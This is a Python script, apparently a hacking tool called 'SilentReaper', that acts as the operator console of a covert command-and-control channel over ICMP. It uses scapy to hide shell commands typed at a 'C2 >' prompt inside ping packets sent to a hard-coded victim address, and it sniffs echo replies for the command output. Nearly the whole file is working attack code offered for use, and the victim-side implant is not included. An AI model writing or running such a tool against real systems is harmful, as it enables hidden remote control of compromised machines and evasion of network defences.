from scapy.all import *

def display_logo():
    logo = """
         ██████  ██▓ ██▓    ████████▓█████  ███▄    █ ▄▄▄█████▓
        ▒██    ▒ ▓██▒▓██▒    ▓  ██▒ ▓▓█   ▀  ██ ▀█   █ ▓  ██▒ ▓▒
        ░ ▓██▄   ▒██▒▒██░    ▒ ▓██░ ▒▒███   ▓██  ▀█ ██▒▒ ▓██░ ▒░
           ▒   ██▒░██░▒██░    ░ ▓██▓ ░▒▓█  ▄ ▓██▒  ▐▌██▒░ ▓██▓ ░ 
        ▒██████▒▒░██░░██████▒  ▒██▒ ░░▒████▒▒██░   ▓██░  ▒██▒ ░ 
        ▒ ▒▓▒ ▒ ░░▓  ░ ▒░▓  ░  ▒ ░░  ░░ ▒░ ░░ ▒░   ▒ ▒   ▒ ░░   
        ░ ░▒  ░ ░ ▒ ░░ ░ ▒  ░    ░    ░ ░  ░░ ░░   ░ ▒░    ░    
        ░  ░  ░   ▒ ░  ░ ░   ░          ░      ░   ░ ░   ░      
              ░   ░      ░  ░           ░  ░         ░          

        ☠️ SilentReaper ☠️ - ICMP Covert C2 
         Created by Mr. Ashir 
    """
    print(logo)

class ICMPServer:
    def __init__(self, victim_ip):
        self.victim_ip = victim_ip

    def send_command(self, command):
        """Sends an ICMP packet with the command"""
        packet = IP(dst=self.victim_ip) / ICMP(type=8) / Raw(load=command)
        send(packet, verbose=False)
        print(f"[+] Sent command: {command}")

    def receive_response(self):
        def packet_callback(packet):
            if packet.haslayer(ICMP) and packet[ICMP].type == 0:  # Type 0 means ICMP Echo Reply
                if packet.haslayer(Raw):
                    output = packet[Raw].load.decode(errors="ignore")
                    print(f"[+] Command output:\n{output}")
                else:
                    print("[!] Received empty response.")
    
        sniff(filter="icmp", prn=packet_callback, timeout=5, store=0)

    def start(self):
        """Starts the C2 interaction"""
        display_logo()  # Show the logo before starting
        while True:
            cmd = input("C2 > ")
            if cmd.lower() in ["exit", "quit"]:
                break
            self.send_command(cmd)
            self.receive_response()

if __name__ == "__main__":
    server = ICMPServer(victim_ip="192.168.1.50")  # Change victim IP
    server.start()
